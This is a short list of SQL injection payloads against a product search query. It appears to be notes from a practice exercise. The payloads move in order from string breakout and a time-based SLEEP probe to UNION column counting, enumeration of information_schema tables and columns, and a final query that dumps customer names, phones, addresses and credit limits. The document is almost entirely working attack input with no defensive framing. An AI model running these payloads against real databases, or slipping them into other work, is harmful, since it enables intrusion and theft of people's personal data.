SELECT * FROM products WHERE productLine LIKE '%tr%';

';-- Will select everything from the database 

Trains' AND 1 = SLEEP(2);-- 



train' UNION (SELECT 1,2,3,4,5,6,7,8,9 FROM dual);-- 

train' UNION (SELECT TABLE_NAME,TABLE_SCHEMA,3,4,5,6,7,8,9 FROM information_schema.tables);-- 
u' UNION (SELECT TABLE_NAME,TABLE_SCHEMA,3,4,5,6,7,8,9 FROM information_schema.tables);--  

u' UNION (SELECT COLUMN_NAME,2,3,4,5,6,7,8,9 FROM information_schema.columns WHERE TABLE_NAME = 'customers');--  

u' UNION (SELECT customerName,phone,addressLine1,addressLine2,city,state,postalCode,country,creditLimit FROM customers);--